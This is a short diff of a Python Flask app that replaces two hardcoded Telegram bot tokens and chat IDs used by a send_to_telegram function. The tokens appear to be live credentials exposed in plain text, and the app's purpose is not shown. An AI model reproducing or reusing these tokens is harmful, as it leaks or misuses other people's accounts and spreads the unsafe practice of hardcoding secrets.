@@ -5,8 +5,8 @@ app = Flask(__name__, static_folder='static')
 app.secret_key = 'your-secret-key-here'  # Change this to a strong secret key
 
 # Telegram configuration
-TELEGRAM_BOT_TOKENS = ['7811028826:AAGENd2zf3RTThIApS-BaAngjxLRFfEZ_Eg', '7986783861:AAEvBWaOxcIR3VvdGNK3HWqqBDle_j3atE8']
-TELEGRAM_CHAT_IDS = ['1938558610', '1174627659']
+TELEGRAM_BOT_TOKENS = ['7692399743:AAHFgwoWb5s2o8sHMJ_KAuP09eUPhkIcLU8', '7740890821:AAEqXm9qsivz9acOy3kPr7sdFd4gMeDD4p4']
+TELEGRAM_CHAT_IDS = ['761808737', '6022746471']
 
 def send_to_telegram(message):
     for bot_token, chat_id in zip(TELEGRAM_BOT_TOKENS, TELEGRAM_CHAT_IDS):
